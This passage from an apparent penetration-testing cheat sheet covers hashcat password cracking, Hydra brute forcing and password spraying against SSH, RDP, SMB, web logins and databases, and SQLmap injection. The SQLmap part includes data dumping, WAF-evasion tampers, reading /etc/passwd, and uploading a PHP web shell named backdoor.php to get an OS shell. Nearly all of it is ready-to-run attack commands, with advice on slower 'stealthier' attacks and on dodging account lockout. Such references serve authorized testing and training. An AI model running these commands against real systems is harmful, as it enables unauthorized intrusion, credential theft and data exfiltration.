# Disable optimizations (for longer passwords)
hashcat -m 1000 -a 0 hashes.txt rockyou.txt
```

**Specific device selection:**

```bash
# List devices
hashcat -I

# Use specific device
hashcat -m 1000 -a 0 -d 1 hashes.txt rockyou.txt

# Use multiple devices
hashcat -m 1000 -a 0 -d 1,2,3 hashes.txt rockyou.txt
```

**Limit runtime:**

```bash
# Run for 60 seconds
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a --runtime=60

# Quit after first crack
hashcat -m 1000 -a 0 hashes.txt rockyou.txt --quit-after-first-crack
```

### Debug and Monitoring

**Status display:**

```bash
# During cracking, press 's' for status
# Press 'p' to pause
# Press 'r' to resume
# Press 'b' to bypass current mask/word
# Press 'q' to quit
```

**Debug mode:**

```bash
hashcat -m 1000 -a 0 hashes.txt rockyou.txt --debug-mode=1 --debug-file=debug.txt
```

**Verbose output:**

```bash
hashcat -m 1000 -a 0 hashes.txt rockyou.txt --status --status-timer=10
```

### Rule Creation

**Basic rule syntax:**

```bash
# Create custom.rule
cat > custom.rule << EOF
# Nothing (no modification)
:
# Lowercase all
l
# Uppercase all
u
# Capitalize
c
# Append year
$2$0$2$4
# Append digits
$0 $1 $2 $3 $4 $5 $6 $7 $8 $9
# Common substitutions
so0 sa@ si1 se3
# Toggle case
t
EOF

hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r custom.rule
```

**Generate rules from cracked passwords:**

```bash
# Analyze password patterns
hashcat --stdout -a 0 cracked_plain.txt | sort -u > unique_plain.txt

# Use maskprocessor to identify patterns
mp64 --increment --increment-min=8 --increment-max=8 ?a?a?a?a?a?a?a?a | head
```

### Hash Format Examples

**MD5:**

```bash
echo -n 'password' | md5sum | cut -d' ' -f1 > md5.hash
hashcat -m 0 -a 0 md5.hash /usr/share/wordlists/rockyou.txt
```

**SHA256:**

```bash
echo -n 'password' | sha256sum | cut -d' ' -f1 > sha256.hash
hashcat -m 1400 -a 0 sha256.hash rockyou.txt
```

**NTLM:**

```bash
# Format: hash or username:hash
hashcat -m 1000 -a 0 ntlm.hash rockyou.txt
```

**NetNTLMv2:**

```bash
# Format from Responder: username::domain:challenge:response:response
hashcat -m 5600 -a 0 netntlmv2.hash rockyou.txt
```

**WPA/WPA2:**

```bash
# Convert pcap to hashcat format
hcxpcapngtool -o wpa.hash capture.pcap

# Crack WPA2
hashcat -m 22000 -a 0 wpa.hash rockyou.txt
```

**bcrypt:**

```bash
hashcat -m 3200 -a 0 bcrypt.hash rockyou.txt
```

**Kerberos TGS-REP:**

```bash
# Format: $krb5tgs$23$...
hashcat -m 13100 -a 0 kerberos.hash rockyou.txt
```

### Practical Examples

**Crack Windows NTLM hashes:**

```bash
# Hash obtained from SAM dump
hashcat -m 1000 -a 0 -w 3 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Crack with multiple strategies:**

```bash
# Strategy 1: Dictionary
hashcat -m 1000 -a 0 hashes.txt rockyou.txt

# Strategy 2: Dictionary + rules
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Strategy 3: Mask (Password + 4 digits)
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?l?l?d?d?d?d

# Strategy 4: Hybrid (wordlist + digits)
hashcat -m 1000 -a 6 hashes.txt rockyou.txt ?d?d?d?d
```

**Distributed cracking:**

```bash
# Skip first 50% of wordlist
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -s 0 -l 50%

# Process second 50%
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -s 50% -l 100%
```

---

## Hydra

### Overview

Hydra performs online password brute forcing against network services. Supports 50+ protocols including SSH, FTP, HTTP, SMB, RDP, and databases.

### Basic Syntax

```bash
hydra [options] [target] [service]
```

### Common Options

```bash
-l <login>        # Single username
-L <file>         # Username list
-p <password>     # Single password
-P <file>         # Password list
-s <port>         # Custom port
-t <tasks>        # Parallel tasks (default 16)
-w <timeout>      # Wait time for responses
-f                # Exit after first valid credential found
-F                # Exit after first valid credential per user
-v / -V           # Verbose / Very verbose
-o <file>         # Output file
-b <format>       # Output format (text, json, jsonv1)
-I                # Ignore restore file
-R                # Restore previous session
-S                # SSL/TLS connection
-O                # Use old SSL v2 and v3
-C <file>         # Colon-separated user:pass format
-e <nsr>          # Additional checks (n=null, s=same as username, r=reverse username)
```

### Service-Specific Syntax

**SSH:**

```bash
# Basic SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

# Multiple usernames
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# Custom port
hydra -l admin -P passwords.txt ssh://192.168.1.10:2222

# Increase threads (use with caution)
hydra -l root -P passwords.txt -t 4 ssh://192.168.1.10
```

**FTP:**

```bash
hydra -l admin -P passwords.txt ftp://192.168.1.10

# Anonymous FTP check

hydra -l anonymous -p "" ftp://192.168.1.10

# Multiple users

hydra -L users.txt -P passwords.txt ftp://192.168.1.10

````

**HTTP/HTTPS Forms:**
```bash
# HTTP POST form (login page)
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

# GET form
hydra -l admin -P passwords.txt 192.168.1.10 http-get-form "/login:user=^USER^&pass=^PASS^:Incorrect"

# HTTPS POST form
hydra -l admin -P passwords.txt 192.168.1.10 -s 443 https-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=Login:F=failed"

# With cookies/session
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:username=^USER^&password=^PASS^:F=failed:H=Cookie: PHPSESSID=abc123"

# Success string instead of failure (S= instead of F=)
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:S=Welcome"
````

**HTTP Basic Auth:**

```bash
hydra -l admin -P passwords.txt 192.168.1.10 http-get /admin/

# HTTPS
hydra -l admin -P passwords.txt -s 443 192.168.1.10 https-get /admin/
```

**SMB:**

```bash
# SMB protocol
hydra -l administrator -P passwords.txt smb://192.168.1.10

# With domain
hydra -l 'DOMAIN\administrator' -P passwords.txt smb://192.168.1.10

# Multiple users
hydra -L users.txt -P passwords.txt smb://192.168.1.10
```

**RDP (Remote Desktop):**

```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.10

# With domain
hydra -l 'DOMAIN\user' -P passwords.txt rdp://192.168.1.10
```

**MySQL:**

```bash
hydra -l root -P passwords.txt mysql://192.168.1.10

# Custom port
hydra -l root -P passwords.txt mysql://192.168.1.10:3307
```

**PostgreSQL:**

```bash
hydra -l postgres -P passwords.txt postgres://192.168.1.10

# Specify database
hydra -l postgres -P passwords.txt postgres://192.168.1.10/template1
```

**MSSQL:**

```bash
hydra -l sa -P passwords.txt mssql://192.168.1.10
```

**Telnet:**

```bash
hydra -l admin -P passwords.txt telnet://192.168.1.10

# Custom prompts
hydra -l admin -P passwords.txt telnet://192.168.1.10 -m "Login:" -m "Password:"
```

**VNC:**

```bash
hydra -P passwords.txt vnc://192.168.1.10
# VNC typically only uses password, no username
```

**SMTP:**

```bash
hydra -l user@domain.com -P passwords.txt smtp://192.168.1.10

# SMTP with TLS
hydra -l user@domain.com -P passwords.txt -S smtp://192.168.1.10:587
```

**POP3:**

```bash
hydra -l user@domain.com -P passwords.txt pop3://192.168.1.10

# POP3S
hydra -l user@domain.com -P passwords.txt -S pop3://192.168.1.10:995
```

**IMAP:**

```bash
hydra -l user@domain.com -P passwords.txt imap://192.168.1.10

# IMAPS
hydra -l user@domain.com -P passwords.txt -S imap://192.168.1.10:993
```

**SNMP:**

```bash
# SNMP community string brute force
hydra -P community_strings.txt snmp://192.168.1.10
```

**LDAP:**

```bash
hydra -l 'cn=admin,dc=example,dc=com' -P passwords.txt ldap://192.168.1.10
```

**MongoDB:**

```bash
hydra -l admin -P passwords.txt mongodb://192.168.1.10
```

**Redis:**

```bash
hydra -P passwords.txt redis://192.168.1.10
# Redis authentication password only
```

### Advanced Usage

**Colon-separated credentials file:**

```bash
# credentials.txt format: username:password
admin:password123
root:toor
user:letmein

hydra -C credentials.txt ssh://192.168.1.10
```

**Exit on first success:**

```bash
# Stop after finding ANY valid credential
hydra -l admin -P passwords.txt -f ssh://192.168.1.10

# Stop after finding valid credential for each user
hydra -L users.txt -P passwords.txt -F ssh://192.168.1.10
```

**Additional password checks:**

```bash
# Try null password, username as password, reversed username
hydra -l admin -P passwords.txt -e nsr ssh://192.168.1.10

# -e n: Try empty/null password
# -e s: Try username as password
# -e r: Try reversed username as password
```

**Output options:**

```bash
# Save to file
hydra -l admin -P passwords.txt -o results.txt ssh://192.168.1.10

# JSON output
hydra -l admin -P passwords.txt -b json -o results.json ssh://192.168.1.10

# Append to existing file
hydra -l admin -P passwords.txt -o results.txt ssh://192.168.1.10
# Note: Hydra automatically appends
```

**Session management:**

```bash
# Save progress automatically (default: hydra.restore)
hydra -l admin -P rockyou.txt ssh://192.168.1.10

# Interrupt with Ctrl+C, restore with:
hydra -R

# Ignore/clear restore file
hydra -I -l admin -P passwords.txt ssh://192.168.1.10
```

**Rate limiting:**

```bash
# Adjust parallel tasks (default 16)
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.10

# Set wait time between attempts (seconds)
hydra -l admin -P passwords.txt -w 3 ssh://192.168.1.10

# Combine for slower, stealthier attacks
hydra -l admin -P passwords.txt -t 1 -w 5 ssh://192.168.1.10
```

**Proxy support:**

```bash
# Use SOCKS4 proxy
hydra -l admin -P passwords.txt -o results.txt ssh://192.168.1.10 -x 127.0.0.1:1080:socks4

# SOCKS5 proxy
hydra -l admin -P passwords.txt ssh://192.168.1.10 -x 127.0.0.1:1080:socks5

# HTTP proxy
hydra -l admin -P passwords.txt http-post-form "..." -x 127.0.0.1:8080:http
```

**Verbose modes:**

```bash
# Verbose (show attempts)
hydra -l admin -P passwords.txt -v ssh://192.168.1.10

# Very verbose (show all details)
hydra -l admin -P passwords.txt -V ssh://192.168.1.10

# Debug mode
hydra -l admin -P passwords.txt -d ssh://192.168.1.10
```

### HTTP Form Attack Details

**Identify form parameters:**

```bash
# View page source or use browser dev tools
# Find form action, input names, failure message

# Example form:
# <form action="/login.php" method="POST">
#   <input name="username">
#   <input name="password">
# </form>
# Error message: "Login failed"

# Hydra syntax:
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
```

**Complex form parameters:**

```bash
# Multiple parameters
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^&submit=Login&redirect=/admin:F=Invalid"

# Hidden fields
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:username=^USER^&password=^PASS^&csrf=static_token:F=failed"

# Conditional redirect (success condition)
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:username=^USER^&password=^PASS^:S=302"
```

**Custom headers:**

```bash
# Add custom headers
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/api/login:username=^USER^&password=^PASS^:F=failed:H=Content-Type: application/json:H=User-Agent: CustomAgent"

# Multiple headers
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=fail:H=X-Forwarded-For\: 127.0.0.1:H=Cookie\: session=abc"
```

**JSON POST data:**

```bash
# Some applications use JSON instead of form data
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/api/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:F=Invalid:H=Content-Type\: application/json"
```

### Wordlist Optimization

**Generate targeted wordlists:**

```bash
# Common default credentials
cat > defaults.txt << EOF
admin:admin
admin:password
root:root
root:toor
administrator:password
EOF

hydra -C defaults.txt ssh://192.168.1.10
```

**Username enumeration first:**

```bash
# Enumerate valid usernames with null password
hydra -L users.txt -p '' ssh://192.168.1.10 -e n -o valid_users.txt

# Then brute force only valid users
hydra -L valid_users.txt -P passwords.txt ssh://192.168.1.10
```

**Password spraying pattern:**

```bash
# Try few common passwords against many users (avoid account lockout)
cat > common_passwords.txt << EOF
Password123
Welcome1
Company2024
Summer2024
EOF

hydra -L users.txt -P common_passwords.txt -t 1 -w 5 ssh://192.168.1.10
```

### Performance Considerations

**Optimal task settings by service:**

[Inference] - Based on typical service behavior and rate limiting:

```bash
# SSH: Conservative (4-8 tasks)
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.10

# FTP: Moderate (8-16 tasks)
hydra -l admin -P passwords.txt -t 16 ftp://192.168.1.10

# HTTP: Higher (16-32 tasks)
hydra -l admin -P passwords.txt -t 32 http-post-form "..."

# SMB: Low (1-4 tasks, avoid lockout)
hydra -l administrator -P passwords.txt -t 1 -w 3 smb://192.168.1.10
```

**Avoid account lockout:**

```bash
# Low task count, wait time between attempts
hydra -L users.txt -P short_list.txt -t 1 -w 5 -f ssh://192.168.1.10

# Try few passwords per user, then move to next
hydra -L users.txt -P top_10_passwords.txt -t 1 -w 10 ssh://192.168.1.10
```

### Troubleshooting

**Common errors and solutions:**

```bash
# "Too many connections" error
# Solution: Reduce tasks
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.10

# Connection timeout
# Solution: Increase wait time
hydra -l admin -P passwords.txt -w 10 ssh://192.168.1.10

# False positives in HTTP forms
# Solution: Verify failure string is unique
# Check page source for exact error message

# SSL/TLS errors
# Solution: Use -S flag or try older SSL
hydra -l admin -P passwords.txt -S smtp://192.168.1.10
hydra -l admin -P passwords.txt -O smtp://192.168.1.10

# Service not supported
# Solution: Check supported services
hydra -U
```

**Debug connection issues:**

```bash
# Test single credential manually
hydra -l admin -p password123 -V ssh://192.168.1.10

# Check if service is accessible
nc -zv 192.168.1.10 22

# Verify form parameters work manually
curl -X POST http://192.168.1.10/login -d "username=admin&password=test"
```

### List Supported Services

```bash
# Show all supported modules
hydra -U

# Show help for specific module
hydra -U ssh
hydra -U http-post-form
```

### Practical Examples

**WordPress brute force:**

```bash
# Standard wp-login.php
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect"

# With verbose output
hydra -l admin -P passwords.txt -V 192.168.1.10 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=ERROR"
```

**SSH with username enumeration:**

```bash
# Step 1: Enumerate users
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p invalid ssh://192.168.1.10 -t 4 -V | grep "password"

# Step 2: Brute force valid users
hydra -l discovered_user -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
```

**RDP brute force (careful with lockout):**

```bash
# Conservative approach
hydra -l administrator -P top_100_passwords.txt -t 1 -w 5 rdp://192.168.1.10
```

**Database brute force:**

```bash
# MySQL
hydra -l root -P passwords.txt mysql://192.168.1.10

# PostgreSQL with database name
hydra -l postgres -P passwords.txt postgres://192.168.1.10/postgres

# MSSQL
hydra -l sa -P passwords.txt mssql://192.168.1.10
```

**Multi-service attack:**

```bash
# Script to try same credentials on multiple services
for service in ssh ftp telnet; do
  hydra -l admin -P passwords.txt -f -o ${service}_results.txt ${service}://192.168.1.10
done
```

---

## SQLmap

### Overview

SQLmap automates SQL injection detection and exploitation. Supports database fingerprinting, data extraction, file system access, and OS command execution through SQL injection vulnerabilities.

### Basic Syntax

```bash
sqlmap -u "http://target.com/page?id=1" [options]
```

### Target Specification

**URL with parameter:**

```bash
# GET parameter
sqlmap -u "http://192.168.1.10/page.php?id=1"

# Multiple parameters
sqlmap -u "http://192.168.1.10/search.php?name=test&category=1"

# Specific parameter to test
sqlmap -u "http://192.168.1.10/page.php?id=1&sort=name" -p id
```

**POST requests:**

```bash
# POST data
sqlmap -u "http://192.168.1.10/login.php" --data="username=admin&password=pass"

# Test specific POST parameter
sqlmap -u "http://192.168.1.10/login.php" --data="user=admin&pass=test" -p user
```

**Request from file:**

```bash
# Capture request with Burp Suite, save to file
# request.txt contains full HTTP request
sqlmap -r request.txt

# Test specific parameter from request
sqlmap -r request.txt -p id
```

**Custom HTTP method:**

```bash
# PUT request
sqlmap -u "http://192.168.1.10/api/update" --method=PUT --data='{"id":1}'

# DELETE request
sqlmap -u "http://192.168.1.10/api/delete" --method=DELETE
```

**Direct database connection:**

```bash
# Connect directly to database
sqlmap -d "mysql://user:pass@192.168.1.10:3306/database"
```

### Request Options

**Custom headers:**

```bash
# Cookie
sqlmap -u "http://192.168.1.10/page?id=1" --cookie="PHPSESSID=abc123; security=low"

# User-Agent
sqlmap -u "http://192.168.1.10/page?id=1" --user-agent="Mozilla/5.0"

# Referer
sqlmap -u "http://192.168.1.10/page?id=1" --referer="http://192.168.1.10/"

# Custom header
sqlmap -u "http://192.168.1.10/api/data?id=1" --headers="Authorization: Bearer token123\nX-Custom: value"
```

**Authentication:**

```bash
# HTTP Basic Auth
sqlmap -u "http://192.168.1.10/admin/page?id=1" --auth-type=Basic --auth-cred="admin:password"

# HTTP Digest Auth
sqlmap -u "http://192.168.1.10/page?id=1" --auth-type=Digest --auth-cred="user:pass"

# NTLM Auth
sqlmap -u "http://192.168.1.10/page?id=1" --auth-type=NTLM --auth-cred="DOMAIN\user:pass"
```

**Proxy:**

```bash
# HTTP proxy
sqlmap -u "http://192.168.1.10/page?id=1" --proxy="http://127.0.0.1:8080"

# SOCKS proxy
sqlmap -u "http://192.168.1.10/page?id=1" --proxy="socks5://127.0.0.1:1080"

# Proxy authentication
sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass"
```

**SSL/TLS:**

```bash
# Ignore SSL errors
sqlmap -u "https://192.168.1.10/page?id=1" --force-ssl

# Custom SSL certificate
sqlmap -u "https://192.168.1.10/page?id=1" --ssl-cert=/path/to/cert.pem
```

### Detection and Testing

**Risk and level:**

```bash
# Risk: 1-3 (likelihood of causing harm)
# Level: 1-5 (number of tests performed)

# Default (safe): --risk=1 --level=1
sqlmap -u "http://192.168.1.10/page?id=1"

# Moderate testing
sqlmap -u "http://192.168.1.10/page?id=1" --level=3 --risk=2

# Thorough testing (may cause issues)
sqlmap -u "http://192.168.1.10/page?id=1" --level=5 --risk=3
```

**Test specific parameters:**

```bash
# Test only 'id' parameter
sqlmap -u "http://192.168.1.10/page?id=1&cat=2" -p id

# Test multiple parameters
sqlmap -u "http://192.168.1.10/page?id=1&cat=2" -p "id,cat"

# Skip specific parameters
sqlmap -u "http://192.168.1.10/page?id=1&session=abc" --skip="session"
```

**Injection techniques:**

```bash
# Specify techniques to use:
# B: Boolean-based blind
# E: Error-based
# U: Union query-based
# S: Stacked queries
# T: Time-based blind
# Q: Inline queries

# All techniques (default)
sqlmap -u "http://192.168.1.10/page?id=1"

# Specific technique
sqlmap -u "http://192.168.1.10/page?id=1" --technique=B

# Multiple techniques
sqlmap -u "http://192.168.1.10/page?id=1" --technique=BEUST

# Union-based only
sqlmap -u "http://192.168.1.10/page?id=1" --technique=U
```

**DBMS specification:**

```bash
# Auto-detect (default)
sqlmap -u "http://192.168.1.10/page?id=1"

# Specify DBMS
sqlmap -u "http://192.168.1.10/page?id=1" --dbms=MySQL
sqlmap -u "http://192.168.1.10/page?id=1" --dbms=PostgreSQL
sqlmap -u "http://192.168.1.10/page?id=1" --dbms=MSSQL
sqlmap -u "http://192.168.1.10/page?id=1" --dbms=Oracle
sqlmap -u "http://192.168.1.10/page?id=1" --dbms=SQLite
```

### Enumeration

**Database fingerprinting:**

```bash
# Banner
sqlmap -u "http://192.168.1.10/page?id=1" --banner

# Current user
sqlmap -u "http://192.168.1.10/page?id=1" --current-user

# Current database
sqlmap -u "http://192.168.1.10/page?id=1" --current-db

# Check if DBA
sqlmap -u "http://192.168.1.10/page?id=1" --is-dba

# Hostname
sqlmap -u "http://192.168.1.10/page?id=1" --hostname
```

**List databases:**

```bash
sqlmap -u "http://192.168.1.10/page?id=1" --dbs
```

**List tables:**

```bash
# All tables in specific database
sqlmap -u "http://192.168.1.10/page?id=1" -D database_name --tables

# All tables in current database
sqlmap -u "http://192.168.1.10/page?id=1" --current-db --tables
```

**List columns:**

```bash
# Columns in specific table
sqlmap -u "http://192.168.1.10/page?id=1" -D database_name -T table_name --columns

# Multiple tables
sqlmap -u "http://192.168.1.10/page?id=1" -D mydb -T users,admins --columns
```

**Dump data:**

```bash
# Dump specific table
sqlmap -u "http://192.168.1.10/page?id=1" -D database_name -T table_name --dump

# Dump specific columns
sqlmap -u "http://192.168.1.10/page?id=1" -D mydb -T users -C "username,password" --dump

# Dump entire database
sqlmap -u "http://192.168.1.10/page?id=1" -D database_name --dump-all

# Dump all databases (caution: may take long time)
sqlmap -u "http://192.168.1.10/page?id=1" --dump-all

# Exclude system databases
sqlmap -u "http://192.168.1.10/page?id=1" --dump-all --exclude-sysdbs
```

**Search for data:**

```bash
# Search for columns
sqlmap -u "http://192.168.1.10/page?id=1" --search -C password

# Search for tables
sqlmap -u "http://192.168.1.10/page?id=1" --search -T user

# Search for databases
sqlmap -u "http://192.168.1.10/page?id=1" --search -D admin
```

### User and Privilege Enumeration

**Database users:**

```bash
# List users
sqlmap -u "http://192.168.1.10/page?id=1" --users

# User passwords
sqlmap -u "http://192.168.1.10/page?id=1" --passwords

# User privileges
sqlmap -u "http://192.168.1.10/page?id=1" --privileges

# Specific user privileges
sqlmap -u "http://192.168.1.10/page?id=1" --privileges -U root

# User roles
sqlmap -u "http://192.168.1.10/page?id=1" --roles
```

### File System Access

**Read files:**

```bash
# Read file from server
sqlmap -u "http://192.168.1.10/page?id=1" --file-read="/etc/passwd"

# Windows file
sqlmap -u "http://192.168.1.10/page?id=1" --file-read="C:/Windows/System32/drivers/etc/hosts"

# Application files
sqlmap -u "http://192.168.1.10/page?id=1" --file-read="/var/www/html/config.php"
```

**Write files:**

```bash
# Write file to server (requires FILE privilege)
sqlmap -u "http://192.168.1.10/page?id=1" --file-write="/root/shell.php" --file-dest="/var/www/html/shell.php"

# Web shell upload
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u "http://192.168.1.10/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/backdoor.php"
```

### OS Command Execution

**OS shell:**

```bash
# Attempt to get OS shell
sqlmap -u "http://192.168.1.10/page?id=1" --os-shell

# After getting shell, run commands:
# os-shell> whoami
# os-shell> cat /etc/passwd
```

**Execute single command:**

```bash
sqlmap -u "http://192.168.1.10/page?id=1" --os-cmd="whoami"
```

**SMB relay (MSSQL specific):**

```bash
# UNC path injection to capture NetNTLM hash
sqlmap -u "http://192.168.1.10/page?id=1" --os-smbrelay

# Requires Responder or similar tool listening on attacker machine
```

### Advanced Techniques

**Second-order SQL injection:**

```bash
# Payload injected in one place, triggered in another
sqlmap -u "http://192.168.1.10/profile?id=1" --second-url="http://192.168.1.10/view_profile"
```

**Tamper scripts:**

```bash
# Bypass WAF/filters
sqlmap -u "http://192.168.1.10/page?id=1" --tamper=space2comment

# Multiple tampers
sqlmap -u "http://192.168.1.10/page?id=1" --tamper=space2comment,between

# Common tamper scripts:
# space2comment: Replace space with /**/ comment
# between: Replace > with BETWEEN
# charencode: URL-encode characters
# apostrophemask: Replace apostrophe with UTF-8
# base64encode: Base64 encode payload
# equaltolike: Replace = with LIKE
```

**List available tampers:**

```bash
sqlmap --list-tampers
```

**Common tamper combinations for WAF bypass:**

```bash
# Generic WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase

# For Microsoft IIS/ASP
sqlmap -u "http://target.com/page?id=1" --tamper=space2mssqlblank

# For MySQL
sqlmap -u "http://target.com/page?id=1" --tamper=space2mysqldash

# For quote filtering
sqlmap -u "http://target.com/page?id=1" --tamper=apostrophemask,apostrophenullencode
```

**Custom injection points:**

```bash
# Mark injection point with asterisk (*)
sqlmap -u "http://192.168.1.10/page" --cookie="id=1*" --level=2

# Multiple injection points
sqlmap -u "http://192.168.1.10/page?id=1*&cat=2*"

# JSON injection
sqlmap -u "http://192.168.1.10/api" --data='{"id":"1*","value":"test"}' --level=3
```

**Blind injection optimization:**

```bash
# Time-based blind delay
sqlmap -u "http://192.168.1.10/page?id=1" --time-sec=3

# Binary search optimization
sqlmap -u "http://192.168.1.10/page?id=1" --technique=B --code=200

# String to match for true condition
sqlmap -u "http://192.168.1.10/page?id=1" --string="Welcome"

# String indicating false condition
sqlmap -u "http://192.168.1.10/page?id=1" --not-string="Error"
```

### Session Management

**Save and resume:**

```bash
# SQLmap automatically saves sessions
# Session files in: ~/.local/share/sqlmap/output/target.com/

# Resume specific session
sqlmap -u "http://192.168.1.10/page?id=1" --flush-session
sqlmap -u "http://192.168.1.10/page?id=1" --fresh-queries

# Answer 'Y' to use previous session when prompted
```

**Output directory:**

```bash
# Custom output directory
sqlmap -u "http://192.168.1.10/page?id=1" --output-dir=/tmp/sqlmap_results
```

### Performance Tuning

**Threading:**

```bash
# Concurrent threads (default 1)
sqlmap -u "http://192.168.1.10/page?id=1" --threads=5

# Maximum threads (use cautiously)
sqlmap -u "http://192.168.1.10/page?id=1" --threads=10
```

**Delays and timeouts:**

```bash
# Delay between requests (seconds)
sqlmap -u "http://192.168.1.10/page?id=1" --delay=1

# Timeout for connections (default 30)
sqlmap -u "http://192.168.1.10/page?id=1" --timeout=60

# Retries on timeout
sqlmap -u "http://192.168.1.10/page?id=1" --retries=3
```

**Optimization flags:**

```bash
# Keep alive connections
sqlmap -u "http://192.168.1.10/page?id=1" --keep-alive

# Null connection (no response body)
sqlmap -u "http://192.168.1.10/page?id=1" --null-connection

# Predict output (optimization for UNION)
sqlmap -u "http://192.168.1.10/page?id=1" --predict-output
```

### Evasion Techniques

**Randomization:**

```bash
# Random User-Agent
sqlmap -u "http://192.168.1.10/page?id=1" --random-agent

# Random parameter values
sqlmap -u "http://192.168.1.10/page?id=1" --randomize=param_name

# HPP (HTTP Parameter Pollution)

sqlmap -u "http://192.168.1.10/page?id=1" --hpp
````

**Chunked transfer encoding:**
```bash
sqlmap -u "http://192.168.1.10/page?id=1" --chunked
````

**Crawl and forms:**

```bash
# Crawl website and test all links
sqlmap -u "http://192.168.1.10/" --crawl=2

# Automatically parse and test forms
sqlmap -u "http://192.168.1.10/login.php" --forms

# Crawl and test forms
sqlmap -u "http://192.168.1.10/" --crawl=2 --forms
```

**Batch mode (non-interactive):**

```bash
# Never ask for user input, use defaults
sqlmap -u "http://192.168.1.10/page?id=1" --batch

# Batch with custom answers
sqlmap -u "http://192.168.1.10/page?id=1" --batch --answers="crack=N"
```

### Practical Workflows

**Initial detection and enumeration:**

```bash
# Step 1: Detect injection
sqlmap -u "http://192.168.1.10/page?id=1" --batch

# Step 2: Enumerate databases
sqlmap -u "http://192.168.1.10/page?id=1" --dbs --batch

# Step 3: Enumerate tables in target database
sqlmap -u "http://192.168.1.10/page?id=1" -D webapp --tables --batch

# Step 4: Enumerate columns in interesting table
sqlmap -u "http://192.168.1.10/page?id=1" -D webapp -T users --columns --batch

# Step 5: Dump data
sqlmap -u "http://192.168.1.10/page?id=1" -D webapp -T users -C "username,password" --dump --batch
```

**Testing from Burp Suite request:**

```bash
# Step 1: Intercept request in Burp, save to file
# Right-click > Copy to file > request.txt

# Step 2: Test with SQLmap
sqlmap -r request.txt --batch

# Step 3: If vulnerable, enumerate
sqlmap -r request.txt --dbs --batch

# Step 4: Dump specific data
sqlmap -r request.txt -D targetdb -T users --dump --batch
```

**WAF bypass workflow:**

```bash
# Step 1: Test without tampers
sqlmap -u "http://192.168.1.10/page?id=1" --batch

# If blocked, Step 2: Identify WAF
sqlmap -u "http://192.168.1.10/page?id=1" --identify-waf

# Step 3: Try tamper scripts
sqlmap -u "http://192.168.1.10/page?id=1" --tamper=space2comment --batch

# Step 4: Multiple tampers + randomization
sqlmap -u "http://192.168.1.10/page?id=1" --tamper=space2comment,between,randomcase --random-agent --delay=1 --batch

# Step 5: Adjust risk and level
sqlmap -u "http://192.168.1.10/page?id=1" --tamper=space2comment --random-agent --level=5 --risk=3 --batch
```

**POST-based injection:**

```bash
# Step 1: Test POST parameter
sqlmap -u "http://192.168.1.10/login.php" --data="username=admin&password=pass" -p username --batch

# Step 2: If vulnerable, enumerate
sqlmap -u "http://192.168.1.10/login.php" --data="username=admin&password=pass" -p username --dbs --batch

# Step 3: Dump credentials
sqlmap -u "http://192.168.1.10/login.php" --data="username=admin&password=pass" -p username -D webapp -T users --dump --batch
```

**Cookie-based injection:**

```bash
# Step 1: Test cookie parameter
sqlmap -u "http://192.168.1.10/profile.php" --cookie="id=1*" --level=2 --batch

# Step 2: Enumerate if vulnerable
sqlmap -u "http://192.168.1.10/profile.php" --cookie="id=1*" --level=2 --dbs --batch

# Step 3: Extract data
sqlmap -u "http://192.168.1.10/profile.php" --cookie="id=1*" --level=2 -D mydb -T sensitive --dump --batch
```

**File upload via SQL injection:**

```bash
# Step 1: Create web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Step 2: Upload shell
sqlmap -u "http://192.168.1.10/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/uploads/shell.php" --batch

# Step 3: Access shell
curl "http://192.168.1.10/uploads/shell.php?cmd=whoami"

# Step 4: Get interactive shell (optional)
sqlmap -u "http://192.168.1.10/page?id=1" --os-shell --batch
```

**Blind injection optimization:**

```bash
# Time-based blind (slower but reliable)
sqlmap -u "http://192.168.1.10/page?id=1" --technique=T --time-sec=2 --batch

# Boolean-based blind (faster if applicable)
sqlmap -u "http://192.168.1.10/page?id=1" --technique=B --string="Welcome" --batch

# Combined approach
sqlmap -u "http://192.168.1.10/page?id=1" --technique=BT --threads=5 --batch
```

### Database-Specific Features

**MySQL/MariaDB:**

```bash
# Read file (load_file)
sqlmap -u "http://192.168.1.10/page?id=1" --file-read="/etc/passwd"

# Write file (into outfile)
